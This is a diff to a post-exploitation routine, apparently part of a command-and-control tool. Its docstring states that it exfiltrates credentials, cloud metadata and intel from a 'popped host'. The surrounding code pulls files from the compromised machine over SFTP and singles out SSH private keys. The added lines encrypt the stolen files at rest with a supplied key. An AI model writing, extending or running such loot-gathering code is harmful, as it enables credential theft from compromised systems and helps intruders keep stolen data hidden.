@@ -451,6 +451,7 @@ def grab_loot(
     stash_dir: str = ".honeywatch/loot_stash",
     timeout_s: float = 10.0,
     extra_key_paths: list[str] | None = None,
+    vault_key: bytes | None = None,
 ) -> LootResult:
     """Exfil credentials, cloud metadata, and intel from a popped host.
 
@@ -520,6 +521,19 @@ def grab_loot(
                 sftp.get(remote_abs, local_path)
                 # Verify the file actually has content (skip empty / dir).
                 if os.path.isfile(local_path) and os.path.getsize(local_path) > 0:
+                    # Encrypt the file at rest if a vault key is provided.
+                    if vault_key is not None:
+                        try:
+                            from honeywatch.c2.crypto import _aes_gcm_encrypt
+                            with open(local_path, "rb") as f:
+                                plaintext = f.read()
+                            encrypted = _aes_gcm_encrypt(plaintext, vault_key)
+                            enc_path = local_path + ".enc"
+                            with open(enc_path, "wb") as f:
+                                f.write(encrypted)
+                            os.replace(enc_path, local_path)
+                        except ImportError:
+                            pass  # cryptography not available; leave plaintext
                     res.files[local_path] = desc
                     if "private key" in desc.lower() or local_name.startswith("ssh_id_"):
                         res.ssh_keys.append(local_path)
